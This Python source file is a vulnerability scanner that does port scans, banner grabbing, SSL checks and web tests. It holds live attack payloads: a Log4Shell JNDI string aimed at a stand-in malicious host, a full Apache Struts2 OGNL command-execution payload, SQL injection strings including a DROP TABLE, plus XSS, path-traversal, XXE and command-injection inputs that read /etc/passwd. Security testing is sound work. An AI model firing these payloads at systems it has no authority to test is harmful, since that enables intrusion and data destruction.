#!/usr/bin/env python3
"""
Enterprise Vulnerability Scanner
Author: Edwyn Moss
Description: Advanced vulnerability assessment and penetration testing framework
"""

import socket
import threading
import requests
import ssl
import subprocess
import json
import csv
import xml.etree.ElementTree as ET
import hashlib
import base64
import urllib.parse
import time
import random
import re
import os
import sys
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

class VulnerabilityScanner:
    def __init__(self, target, threads=50, timeout=5):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities = []
        self.open_ports = []
        self.discovered_urls = set()
        self.scanned_urls = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Common vulnerabilities database
        self.cve_patterns = {
            'CVE-2021-44228': {
                'name': 'Log4Shell',
                'severity': 'Critical',
                'payload': '${jndi:ldap://malicious.server.com/exploit}',
                'description': 'Log4j Remote Code Execution'
            },
            'CVE-2017-5638': {
                'name': 'Apache Struts2',
                'severity': 'Critical',
                'payload': '%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
                'description': 'Apache Struts2 Remote Code Execution'
            }
        }
        
        # Common ports for scanning
        self.common_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995,
            1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017
        ]
        
    def add_vulnerability(self, vuln_type, description, severity, target, evidence=None):
        """Add a discovered vulnerability to the results"""
        vulnerability = {
            'type': vuln_type,
            'description': description,
            'severity': severity,
            'target': target,
            'evidence': evidence,
            'timestamp': datetime.now().isoformat(),
            'scanner': 'VulnerabilityScanner v2.0'
        }
        self.vulnerabilities.append(vulnerability)
        
        # Color-coded output based on severity
        color_map = {
            'Critical': '\033[91m',  # Red
            'High': '\033[93m',      # Yellow
            'Medium': '\033[94m',    # Blue
            'Low': '\033[92m',       # Green
            'Info': '\033[96m'       # Cyan
        }
        reset_color = '\033[0m'
        color = color_map.get(severity, '')
        
        print(f"{color}[{severity}] {vuln_type}: {description}{reset_color}")
        if evidence:
            print(f"Evidence: {evidence[:200]}...")
            
    def port_scan(self, port):
        """Scan individual port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                self.open_ports.append(port)
                
                # Banner grabbing
                try:
                    banner = self.grab_banner(self.target, port)
                    if banner:
                        self.analyze_banner(port, banner)
                except:
                    pass
                    
            sock.close()
        except Exception as e:
            pass
            
    def grab_banner(self, host, port):
        """Grab service banner for version detection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            
            # Send appropriate probes based on port
            if port == 21:  # FTP
                sock.send(b"USER anonymous\r\n")
            elif port == 25:  # SMTP
                sock.send(b"HELO test\r\n")
            elif port == 110:  # POP3
                sock.send(b"USER test\r\n")
            elif port in [80, 8080]:  # HTTP
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            elif port == 443:  # HTTPS
                return self.grab_ssl_banner(host, port)
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            return banner.strip()
            
        except Exception as e:
            return None
            
    def grab_ssl_banner(self, host, port):
        """Grab SSL certificate information"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    return json.dumps(cert, default=str)
        except Exception as e:
            return None
            
    def analyze_banner(self, port, banner):
        """Analyze service banners for vulnerabilities"""
        banner_lower = banner.lower()
        
        # Check for outdated versions
        version_patterns = {
            'apache': r'apache[/\s]+(\d+\.\d+\.\d+)',
            'nginx': r'nginx[/\s]+(\d+\.\d+\.\d+)',
            'openssh': r'openssh[_\s]+(\d+\.\d+)',
            'vsftpd': r'vsftpd[_\s]+(\d+\.\d+\.\d+)',
            'postfix': r'postfix[_\s]+(\d+\.\d+\.\d+)',
            'mysql': r'mysql[_\s]+(\d+\.\d+\.\d+)',
            'php': r'php[/\s]+(\d+\.\d+\.\d+)'
        }
        
        for service, pattern in version_patterns.items():
            match = re.search(pattern, banner_lower)
            if match:
                version = match.group(1)
                self.check_version_vulnerabilities(service, version, port)
                
        # Check for information disclosure
        if 'server:' in banner_lower or 'x-powered-by:' in banner_lower:
            self.add_vulnerability(
                'Information Disclosure',
                f'Service banner reveals version information on port {port}',
                'Low',
                f"{self.target}:{port}",
                banner[:200]
            )
            
    def check_version_vulnerabilities(self, service, version, port):
        """Check if detected version has known vulnerabilities"""
        vulnerable_versions = {
            'apache': {
                '2.4.49': ['CVE-2021-41773', 'CVE-2021-42013'],
                '2.4.48': ['CVE-2021-40438'],
                '2.4.46': ['CVE-2021-26690', 'CVE-2021-26691']
            },
            'nginx': {
                '1.20.0': ['CVE-2021-23017'],
                '1.19.10': ['CVE-2021-23017']
            },
            'openssh': {
                '8.5': ['CVE-2021-41617'],
                '8.4': ['CVE-2020-14145']
            }
        }
        
        if service in vulnerable_versions and version in vulnerable_versions[service]:
            cves = vulnerable_versions[service][version]
            for cve in cves:
                self.add_vulnerability(
                    'Outdated Software',
                    f'{service.title()} {version} has known vulnerability {cve}',
                    'High',
                    f"{self.target}:{port}",
                    f"Detected version: {version}"
                )
                
    def comprehensive_port_scan(self):
        """Perform comprehensive port scanning"""
        print(f"\n[*] Starting port scan on {self.target}")
        print(f"[*] Scanning {len(self.common_ports)} common ports...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.port_scan, port) for port in self.common_ports]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
                    
        print(f"[+] Found {len(self.open_ports)} open ports: {sorted(self.open_ports)}")
        
    def web_vulnerability_scan(self, url):
        """Comprehensive web application vulnerability scanning"""
        print(f"\n[*] Starting web vulnerability scan on {url}")
        
        # Basic connectivity test
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            if response.status_code != 200:
                return
        except Exception as e:
            print(f"[-] Failed to connect to {url}: {e}")
            return
            
        # Test for common web vulnerabilities
        self.test_sql_injection(url)
        self.test_xss_vulnerabilities(url)
        self.test_directory_traversal(url)
        self.test_command_injection(url)
        self.test_xxe_injection(url)
        self.test_security_headers(url)
        self.test_csrf_protection(url)
        self.test_clickjacking_protection(url)
        self.crawl_and_test(url)
        
    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT 1,2,3,4,5--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "admin'--",
            "admin' /*",
            "' OR 1=1--",
            "' OR 'a'='a",
            "1; waitfor delay '00:00:10'--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]
        
        # Test GET parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            for payload in sql_payloads:
                test_url = url.replace('=', f'={urllib.parse.quote(payload)}')
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    if self.detect_sql_error(response.text):
                        self.add_vulnerability(
                            'SQL Injection',
                            f'Potential SQL injection in GET parameter',
                            'Critical',
                            test_url,
                            response.text[:500]
                        )
                        break
                except:
                    continue
                    
        # Test POST parameters
        forms = self.extract_forms(url)
        for form in forms:
            for payload in sql_payloads[:5]:  # Test fewer payloads for POST
                form_data = {field: payload for field in form.get('fields', [])}
                try:
                    if form.get('method', 'GET').upper() == 'POST':
                        response = self.session.post(form['action'], data=form_data, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.get(form['action'], params=form_data, timeout=self.timeout, verify=False)
                        
                    if self.detect_sql_error(response.text):
                        self.add_vulnerability(
                            'SQL Injection',
                            f'Potential SQL injection in form field',
                            'Critical',
                            form['action'],
                            response.text[:500]
                        )
                        break
                except:
                    continue
                    
    def detect_sql_error(self, content):
        """Detect SQL error messages in response"""
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
            'odbc sql', 'sqlite_', 'postgresql', 'warning: mysql',
            'valid mysql result', 'mysqlclient', 'microsoft access',
            'ole db', 'odbc', 'adodb', 'jboss', 'coldfusion',
            'macromedia', 'error in your sql syntax', 'invalid query',
            'column count doesn\'t match value count'
        ]
        
        content_lower = content.lower()
        return any(error in content_lower for error in sql_errors)
        
    def test_xss_vulnerabilities(self, url):
        """Test for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>'
        ]
        
        # Test reflected XSS
        parsed_url = urlparse(url)
        if parsed_url.query:
            for payload in xss_payloads:
                test_url = url.replace('=', f'={urllib.parse.quote(payload)}')
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    if payload in response.text or urllib.parse.unquote(payload) in response.text:
                        self.add_vulnerability(
                            'Cross-Site Scripting (XSS)',
                            f'Reflected XSS vulnerability detected',
                            'High',
                            test_url,
                            payload
                        )
                        break
                except:
                    continue
                    
        # Test stored XSS in forms
        forms = self.extract_forms(url)
        for form in forms:
            for payload in xss_payloads[:3]:  # Test fewer payloads for forms
                form_data = {field: payload for field in form.get('fields', [])}
                try:
                    if form.get('method', 'GET').upper() == 'POST':
                        response = self.session.post(form['action'], data=form_data, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.get(form['action'], params=form_data, timeout=self.timeout, verify=False)
                        
                    if payload in response.text:
                        self.add_vulnerability(
                            'Cross-Site Scripting (XSS)',
                            f'Potential stored XSS vulnerability in form',
                            'High',
                            form['action'],
                            payload
                        )
                        break
                except:
                    continue
                    
    def test_directory_traversal(self, url):
        """Test for directory traversal vulnerabilities"""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd',
            '../../../boot.ini',
            '..\\..\\..\\boot.ini'
        ]
        
        parsed_url = urlparse(url)
        if parsed_url.query:
            for payload in traversal_payloads:
                test_url = url.replace('=', f'={urllib.parse.quote(payload)}')
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    if self.detect_directory_traversal(response.text):
                        self.add_vulnerability(
                            'Directory Traversal',
                            f'Directory traversal vulnerability detected',
                            'High',
                            test_url,
                            response.text[:500]
                        )
                        break
                except:
                    continue
                    
    def detect_directory_traversal(self, content):
        """Detect directory traversal success indicators"""
        indicators = [
            'root:x:', '[boot loader]', '[operating systems]',
            '# /etc/passwd', 'daemon:x:', 'bin:x:', 'sys:x:'
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in indicators)
        
    def test_command_injection(self, url):
        """Test for command injection vulnerabilities"""
        cmd_payloads = [
            '; whoami',
            '| whoami',
            '& whoami',
            '`whoami`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| type c:\\windows\\system.ini',
            '& dir',
            '; ls -la'
        ]
        
        parsed_url = urlparse(url)
        if parsed_url.query:
            for payload in cmd_payloads:
                test_url = url.replace('=', f'={urllib.parse.quote(payload)}')
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    if self.detect_command_injection(response.text):
                        self.add_vulnerability(
                            'Command Injection',
                            f'Command injection vulnerability detected',
                            'Critical',
                            test_url,
                            response.text[:500]
                        )
                        break
                except:
                    continue
                    
    def detect_command_injection(self, content):
        """Detect command injection success indicators"""
        indicators = [
            'uid=', 'gid=', 'groups=', 'root:', 'administrator',
            'c:\\windows', '/bin/', '/usr/', 'volume serial number'
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in indicators)
        
    def test_xxe_injection(self, url):
        """Test for XXE injection vulnerabilities"""
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''
        
        forms = self.extract_forms(url)
        for form in forms:
            if form.get('method', 'GET').upper() == 'POST':
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(
                        form['action'], 
                        data=xxe_payload, 
                        headers=headers, 
                        timeout=self.timeout, 
                        verify=False
                    )
                    
                    if 'root:x:' in response.text or '/bin/' in response.text:
                        self.add_vulnerability(
                            'XXE Injection',
                            f'XXE injection vulnerability detected',
                            'High',
                            form['action'],
                            response.text[:500]
                        )
                except:
                    continue
                    
    def test_security_headers(self, url):
        """Test for missing security headers"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-XSS-Protection': 'XSS protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'Content injection protection',
                'X-Content-Security-Policy': 'Legacy CSP protection',
                'Referrer-Policy': 'Information disclosure protection'
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in headers:
                    missing_headers.append(f"{header} ({description})")
                    
            if missing_headers:
                self.add_vulnerability(
                    'Missing Security Headers',
                    f'Missing security headers: {", ".join(missing_headers)}',
                    'Medium',
                    url,
                    f"Response headers: {dict(headers)}"
                )
                
        except Exception as e:
            pass
            
    def test_csrf_protection(self, url):
        """Test for CSRF protection"""
        forms = self.extract_forms(url)
        
        for form in forms:
            if form.get('method', 'GET').upper() == 'POST':
                csrf_protected = False
                
                # Check for CSRF tokens in form fields
                csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token', 'csrfmiddlewaretoken']
                for field in form.get('fields', []):
                    if any(indicator in field.lower() for indicator in csrf_indicators):
                        csrf_protected = True
                        break
                        
                if not csrf_protected:
                    self.add_vulnerability(
                        'Missing CSRF Protection',
                        f'Form lacks CSRF protection tokens',
                        'Medium',
                        form['action'],
                        f"Form fields: {form.get('fields', [])}"
                    )
                    
    def test_clickjacking_protection(self, url):
        """Test for clickjacking protection"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            
            x_frame_options = response.headers.get('X-Frame-Options', '').lower()
            csp = response.headers.get('Content-Security-Policy', '').lower()
            
            protected = False
            
            if x_frame_options in ['deny', 'sameorigin']:
                protected = True
            elif 'frame-ancestors' in csp:
                protected = True
                
            if not protected:
                self.add_vulnerability(
                    'Clickjacking Vulnerability',
                    f'Page can be embedded in frames (missing X-Frame-Options or CSP frame-ancestors)',
                    'Medium',
                    url,
                    f"X-Frame-Options: {response.headers.get('X-Frame-Options', 'Not set')}"
                )
                
        except Exception as e:
            pass
            
    def extract_forms(self, url):
        """Extract forms from HTML page"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            forms = []
            
            # Simple regex-based form extraction
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            
            form_matches = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
            
            for action, form_content in form_matches:
                if not action.startswith('http'):
                    action = urljoin(url, action)
                    
                # Extract method
                method_match = re.search(r'method=["\']([^"\']*)["\']', form_content, re.IGNORECASE)
                method = method_match.group(1) if method_match else 'GET'
                
                # Extract input fields
                fields = re.findall(input_pattern, form_content, re.IGNORECASE)
                
                forms.append({
                    'action': action,
                    'method': method,
                    'fields': fields
                })
                
            return forms
            
        except Exception as e:
            return []
            
    def crawl_and_test(self, base_url, max_depth=2, current_depth=0):
        """Crawl website and test discovered URLs"""
        if current_depth >= max_depth or base_url in self.scanned_urls:
            return
            
        self.scanned_urls.add(base_url)
        
        try:
            response = self.session.get(base_url, timeout=self.timeout, verify=False)
            
            # Extract links
            link_pattern = r'href=["\']([^"\']*)["\']'
            links = re.findall(link_pattern, response.text, re.IGNORECASE)
            
            for link in links:
                if link.startswith('http'):
                    if urlparse(link).netloc == urlparse(base_url).netloc:
                        self.discovered_urls.add(link)
                elif link.startswith('/'):
                    full_url = urljoin(base_url, link)
                    self.discovered_urls.add(full_url)
                    
            # Test a few discovered URLs
            new_urls = list(self.discovered_urls - self.scanned_urls)[:5]
            for url in new_urls:
                self.crawl_and_test(url, max_depth, current_depth + 1)
                
        except Exception as e:
            pass
            
    def ssl_vulnerability_scan(self, target, port=443):
        """Scan for SSL/TLS vulnerabilities"""
        print(f"\n[*] Starting SSL vulnerability scan on {target}:{port}")
        
        try:
            # Test SSL/TLS configuration
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((target, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    protocol = ssock.version()
                    
                    # Check certificate validity
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    if not_after < datetime.now():
                        self.add_vulnerability(
                            'Expired SSL Certificate',
                            f'SSL certificate expired on {cert["notAfter"]}',
                            'High',
                            f"{target}:{port}",
                            f"Certificate: {cert.get('subject', '')}"
                        )
                        
                    # Check for weak ciphers
                    if cipher and len(cipher) >= 2:
                        cipher_name = cipher[0]
                        if any(weak in cipher_name.upper() for weak in ['RC4', 'DES', 'MD5', 'NULL']):
                            self.add_vulnerability(
                                'Weak SSL Cipher',
                                f'Weak cipher suite detected: {cipher_name}',
                                'Medium',
                                f"{target}:{port}",
                                f"Full cipher: {cipher}"
                            )
                            
                    # Check for outdated protocols
                    if protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        self.add_vulnerability(
                            'Outdated SSL/TLS Protocol',
                            f'Outdated protocol in use: {protocol}',
                            'Medium',
                            f"{target}:{port}",
                            f"Protocol: {protocol}"
                        )
                        
        except Exception as e:
            pass
            
    def generate_report(self, output_format='json'):
        """Generate comprehensive vulnerability report"""
        print(f"\n{'='*60}")
        print("VULNERABILITY ASSESSMENT REPORT")
        print(f"{'='*60}")
        print(f"Target: {self.target}")
        print(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Open Ports: {len(self.open_ports)}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"URLs Discovered: {len(self.discovered_urls)}")
        
        if self.vulnerabilities:
            severity_count = {}
            for vuln in self.vulnerabilities:
                severity = vuln['severity']
                severity_count[severity] = severity_count.get(severity, 0) + 1
                
            print(f"\nVULNERABILITY BREAKDOWN:")
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                if severity in severity_count:
                    print(f"{severity}: {severity_count[severity]}")
                    
            print(f"\nDETAILED FINDINGS:")
            print("-" * 40)
            
            for vuln in sorted(self.vulnerabilities, key=lambda x: 
                ['Critical', 'High', 'Medium', 'Low', 'Info'].index(x['severity'])):
                print(f"\n[{vuln['severity']}] {vuln['type']}")
                print(f"Description: {vuln['description']}")
                print(f"Target: {vuln['target']}")
                print(f"Timestamp: {vuln['timestamp']}")
                if vuln['evidence']:
                    print(f"Evidence: {vuln['evidence'][:200]}...")
                    
        report_data = {
            'target': self.target,
            'scan_date': datetime.now().isoformat(),
            'open_ports': sorted(self.open_ports),
            'discovered_urls': list(self.discovered_urls),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'open_ports_count': len(self.open_ports),
                'urls_discovered': len(self.discovered_urls)
            }
        }
        
        # Save report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vulnerability_report_{self.target}_{timestamp}"
        
        if output_format.lower() == 'json':
            with open(f"{filename}.json", 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"\n[+] JSON report saved to: {filename}.json")
            
        elif output_format.lower() == 'csv':
            with open(f"{filename}.csv", 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Type', 'Description', 'Severity', 'Target', 'Timestamp', 'Evidence'])
                for vuln in self.vulnerabilities:
                    writer.writerow([
                        vuln['type'], vuln['description'], vuln['severity'],
                        vuln['target'], vuln['timestamp'], vuln.get('evidence', '')[:500]
                    ])
            print(f"\n[+] CSV report saved to: {filename}.csv")
            
        return report_data
        
def main():
    parser = argparse.ArgumentParser(description='Enterprise Vulnerability Scanner')
    parser.add_argument('target', help='Target host or URL to scan')
    parser.add_argument('-p', '--ports', action='store_true', help='Perform port scan')
    parser.add_argument('-w', '--web', action='store_true', help='Perform web vulnerability scan')
    parser.add_argument('-s', '--ssl', action='store_true', help='Perform SSL vulnerability scan')
    parser.add_argument('-a', '--all', action='store_true', help='Perform all scans')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('-o', '--output', choices=['json', 'csv'], default='json', help='Output format')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    
    args = parser.parse_args()
    
    print("Enterprise Vulnerability Scanner v2.0")
    print("Author: Edwyn Moss")
    print("=" * 50)
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        url = args.target
        target_host = urlparse(url).netloc
    else:
        target_host = args.target
        url = f"http://{target_host}"
        
    scanner = VulnerabilityScanner(target_host, args.threads, args.timeout)
    
    try:
        if args.all or args.ports:
            scanner.comprehensive_port_scan()
            
        if args.all or args.web:
            scanner.web_vulnerability_scan(url)
            
        if args.all or args.ssl:
            if 443 in scanner.open_ports or args.ssl:
                scanner.ssl_vulnerability_scan(target_host)
                
        # Generate report
        scanner.generate_report(args.output)
        
    except KeyboardInterrupt:
        print("\n[-] Scan interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
        
if __name__ == "__main__":
    main() 